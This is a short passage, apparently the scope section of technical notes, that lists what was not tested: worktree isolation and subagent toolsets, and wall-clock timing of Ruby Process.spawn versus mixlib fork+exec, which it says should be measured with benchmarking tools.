- **Anything under `--isolation worktree` or a subagent's own toolset.** One session, one toolset,
  throughout.
- **Timing.** Nothing here records wall-clock, and the term arm's `Process.spawn` versus mixlib's
  `fork`+`exec` cost difference (`out.rb:13-20` measures 0.6–1.8ms against 3.1–26.7ms, scaling with
  parent RSS) is a claim no section above re-measures. If a round wants it, take it with `bench`'s
  instruments and not with a stopwatch at the prompt.
